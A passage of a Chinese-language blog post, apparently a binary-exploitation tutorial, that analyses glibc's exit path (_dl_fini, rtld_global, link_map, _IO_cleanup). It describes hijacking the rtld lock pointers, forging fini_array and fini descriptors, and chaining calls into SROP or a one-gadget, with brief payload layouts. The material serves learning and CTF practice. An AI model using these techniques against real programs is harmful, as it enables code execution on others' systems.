class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   ElfW(Addr) l_addr;                <span class="comment">/* 模块在内存中的的基地址 */</span></span><br><span class="line">   <span class="type">char</span> *l_name;                     <span class="comment">/* 模块的文件名  */</span></span><br><span class="line">   ElfW(Dyn) * l_ld;                 <span class="comment">/* 指向ELF中的Dynamic节 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 双向链表指针 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 这个模块所属NameSapce的idx  */</span></span><br><span class="line">   Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">      l_info是ELF节描述符组成的的数组</span></span><br><span class="line"><span class="comment">      ELF中一个节, 使用一个ElfW(Dyn)描述</span></span><br><span class="line"><span class="comment">      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   ElfW(Dyn) * l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br><span class="line">   <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELF的头表  */</span></span><br><span class="line">   ElfW(Addr) l_entry;        <span class="comment">/* ELF入口点  */</span></span><br><span class="line">   ElfW(Half) l_phnum;        <span class="comment">/* 头表中有多少节  */</span></span><br><span class="line">   ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节中有多少描述符  */</span></span><br><span class="line"></span><br><span class="line">    ...;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ElfW(Dyn)是一个节描述符类型(也就是一个宏), 宏展开结果为<strong>Elf64_Dyn</strong>, 这个类型被定义在elf.h文件中, 与ELF中的节描述对应</p><p>这个结构体在elf的学习中很重要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword    d_tag;            <span class="comment">/* 便签, 用于标注描述符类型,每一个描述符类型都对应一个类型 */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span>        </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Xword d_val;        <span class="comment">/* 内容可以是一个值 */</span></span><br><span class="line">  Elf64_Addr d_ptr;            <span class="comment">/* 也可以是一个指针 */</span></span><br><span class="line">&#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>至此rtld_global的结构就清楚了, 他自顶向下按照: <strong>命名空间-&gt;模块-&gt;节</strong> 的形式<u>描述所有的模块,</u> 通过_ns_unique_sym_table描述命名空间中所有的可见符号</p><h2 id="dl-fini-源码分析"><a href="#dl-fini-源码分析" class="headerlink" title="_dl_fini()源码分析"></a>_dl_fini()源码分析</h2><p>理解了模块是如何组织的之后, _dl_fini的任务就显而易见了:</p><ul><li>遍历rtld_global中所有的命名空间</li><li>遍历命名空间中所有的模块</li><li><strong>找到这个模块的fini_array段, 并调用其中的所有函数指针</strong></li><li><strong>找到这个模块的fini段, 调用fini()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> internal_function _dl_fini(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) <span class="comment">//遍历_rtld_global中的所有非共享模块: _dl_ns[DL_NNS]</span></span><br><span class="line">    &#123;</span><br><span class="line">        __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="comment">/* 如果这个NameSapce没加载模块, 或者不需要释放, 就不需要做任何事, 就直接调用rtld中的函数指针释放锁 */</span></span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit)</span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//否则遍历模块</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 把这个命名空间中的所有模块指针, 都复制到maps数组中  */</span></span><br><span class="line">            <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">            assert(nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next) <span class="comment">//遍历链表</span></span><br><span class="line">                <span class="keyword">if</span> (l == l-&gt;l_real)                                                <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">                &#123;</span><br><span class="line">                    assert(i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">                    maps[i] = l;</span><br><span class="line">                    l-&gt;l_idx = i;</span><br><span class="line">                    ++i;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Bump l_direct_opencount of all objects so that they are not dlclose()ed from underneath us.  */</span></span><br><span class="line">                    ++l-&gt;l_direct_opencount;</span><br><span class="line">                &#125;</span><br><span class="line">            ...;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;    <span class="comment">//多少个模块</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 对maps进行排序, 确定析构顺序 */</span></span><br><span class="line">            _dl_sort_fini(maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//释放锁</span></span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));    </span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 从前往后, 析构maps中的每一个模块 */</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">                    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* 是否包含fini_array节, 或者fini节 */</span></span><br><span class="line">                    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* debug时打印下相关信息 */</span></span><br><span class="line">                        <span class="keyword">if</span> (__builtin_expect(GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                            _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,DSO_FILENAME(l-&gt;l_name),ns);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 如果有fini_array节的话 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                l-&gt;l_addr: 模块l的加载基地址</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]: 模块l中fini_array节的描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr: 模块l中fini_arrary节的偏移</span></span><br><span class="line"><span class="comment">                                array: 为模块l的fini_array节的内存地址</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *)(l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">/* </span></span><br><span class="line"><span class="comment">                                ELF中 fini_arraysz节用来记录fini_array节的大小</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]: 模块l中fini_arraysz节描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val: 就是fini_array节的大小, 以B为单位</span></span><br><span class="line"><span class="comment">                                i: fini_array节的大小/一个指针大小, 即fini_array中有多少个析构函数</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span>(ElfW(Addr)));</span><br><span class="line">                            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)    <span class="comment">//从后往前, 调用fini_array中的每一个析构函数</span></span><br><span class="line">                                ((<span class="type">fini_t</span>)<span class="built_in">array</span>[i])();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 调用fini段中的函数 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                            DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ...;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">                --l-&gt;l_direct_opencount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考2-rtdl-fini-带来的可利用点"><a href="#思考2-rtdl-fini-带来的可利用点" class="headerlink" title="思考2:rtdl_fini()带来的可利用点"></a>思考2:rtdl_fini()带来的可利用点</h2><p><strong>rtdl_fini()十分依赖与rtld_global这一数据结构, 并且rtld_global中的数据并没有被加密</strong>, 这就带来了两个攻击面</p><ul><li><strong>劫持rtld_global中的锁相关函数指针</strong></li><li><strong>修改rtld_global中的l_info, 伪造fini_array/ fini的节描述符, 从而劫持fini_array/ fini到任意位置, 执行任意函数</strong></li></ul><h3 id="0x1劫持rtld-global中的函数指针"><a href="#0x1劫持rtld-global中的函数指针" class="headerlink" title="0x1劫持rtld_global中的函数指针"></a>0x1劫持rtld_global中的函数指针</h3><p>ld相关函数在使用rtld_global时都需要先上锁, 以避免多进程下的条件竞争问题</p><p>相关函数包括但不限于:</p><ul><li>_dl_open()</li><li>_dl_fini()</li><li>….</li></ul><p>上锁操作是通过宏进行的, 宏定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure><p>查看宏<code>GL</code>的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>宏展开:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line">=&gt;    GL(dl_rtld_lock_recursive) (&amp; GL(dl_load_lock).mutex)</span><br><span class="line">=&gt;    _rtld_global.dl_rtld_lock_recursive(&amp;_rtld_global.dl_load_lock.mutex)</span><br></pre></td></tr></table></figure><p>可以看到实际调用的是dl_rtld_lock_recursive函数指针</p><p>释放锁的操作也是类似的, 调用的是_dl_rtld_unlock_recursive函数指针, 这两个函数指针再rtld_global中定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...;</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_lock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_unlock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ld作为mmap的文件, 与libc地址固定</strong></p><p><strong>也就是说, 当有了任意写+libc地址后, 我们可以通过覆盖_rtld_global中的lock/ unlock函数指针来getshell</strong></p><h3 id="0x2劫持l-info伪造fini-array节"><a href="#0x2劫持l-info伪造fini-array节" class="headerlink" title="0x2劫持l_info伪造fini_array节"></a>0x2劫持l_info伪造fini_array节</h3><p>我们的目标是伪造rtld_global中关于fini_array节与fini_arraysize节的描述</p><p>将fini_array节迁移到一个可控位置, 比如堆区, 然后在这个可控位置中写入函数指针, 那么在exit()时就会依次调用其中的函数指针</p><p><strong>l_info中关于fini_array节的描述符下标为26, 关于fini_arraysz节的下标是28,l_info中的指针正好指向的就是Dynamic段中相关段描述符</strong></p><p>此时我们就可以回答ELF中fini_array中的析构函数是怎么被调用的这个问题了:</p><p><strong>exit()调用__exit_funcs链表中的_rtdl_fini()函数, 由_rtdl_fini()函数寻找到ELF的fini_array节并调用</strong></p><p>假设我们修改rtld_global中的l_info[0x1a]为addrA, 修改l_info[0x1c]为addrB</p><p>那么首先在addrA addrB中伪造好描述符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0x1a, addrC)</span><br><span class="line">addrB: flat(0x1b, N)</span><br></pre></td></tr></table></figure><p><strong>然后在addrC中写入函数指针就可以在exit时执行了</strong></p><h3 id="0x3fini-array与ROP-SROP"><a href="#0x3fini-array与ROP-SROP" class="headerlink" title="0x3fini_array与ROP(SROP)"></a>0x3fini_array与ROP(SROP)</h3><p>当我们可以劫持fini_array之后, 我们就具备了连续调用多个函数的能力, 那么有无可能像ROP一样, 让多个函数进行组合, 完成复杂的工作?</p><p>多个fini_array函数调用之间, 寄存器环境十分稳定, 只有: rdx r13会被破坏, 这是一个好消息</p><p>考察执行call时的栈环境, 我们发现rdi总是指向一个可读可写区域, 可以当做我们函数的缓冲区</p><p>那么就已经有了大致的利用思路,</p><ol><li>让fini_array先调用gets()函数, 在rdi中读入SigreturnFrame</li><li>然后再调用setcontext+53, 即可进行SROP, 劫持所有寄存器</li><li>如果高版本libc, setcontext使用rdx作为参数, 那么在gets(rdi)后还需要一个gadget, 能通过rdi设置rdx,<br>再执行setcontext</li></ol><h3 id="0x4劫持fini"><a href="#0x4劫持fini" class="headerlink" title="0x4劫持fini"></a>0x4劫持fini</h3><p>fini段在l_info中下标为13,这个描述符中直接放的就是fini函数指针(前面有提到动态链接下这是个空函数，由_dl_fini调用), 利用手法较为简单, 但是只能执行一个函数, 通常设置为onegadget</p><p>例如我们可以<strong>修改rtld_global中l_info[0xd]为addrA, 然后再addrA中写入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0xd, onegadget)</span><br></pre></td></tr></table></figure><p>就可以在exit()时触发</p><h3 id="0x5exit-与FILE"><a href="#0x5exit-与FILE" class="headerlink" title="0x5exit()与FILE"></a>0x5exit()与FILE</h3><p>一开始的run_exit_handlers么, 在遍历完exit_funcs链表后, 还有最后一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">  RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure><p>__libc_atexit其实<strong>是libc中的一个段</strong></p><p><strong>这个段中就是libc退出时的析构函数</strong></p><p><strong>其中默认只有一个函数fcloseall()</strong></p><p>这个函数会调用<strong>_IO_cleanup()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 关闭所有流.  */</span></span><br><span class="line"><span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_IO_cleanup()会调用两个函数</strong></p><ul><li><strong>_IO_flush_all_lockp()会通过_IO_list_all遍历所有流, 对每个流调用_IO_OVERFLOW(fp), 保证关闭前缓冲器中没有数据残留</strong></li><li><strong>_IO_unbuffer_all()会通过_IO_list_all遍历所有流, 对每个流调用_IO_SETBUF(fp, NULL, 0)即无缓冲模式, 来释放流的缓冲区</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_cleanup(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 刷新所有流 */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 关闭所有流的缓冲区 */</span></span><br><span class="line">  _IO_unbuffer_all();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment"> stream.  */</span></span><br><span class="line">      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">      freeres_list = fp;</span><br><span class="line">      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span 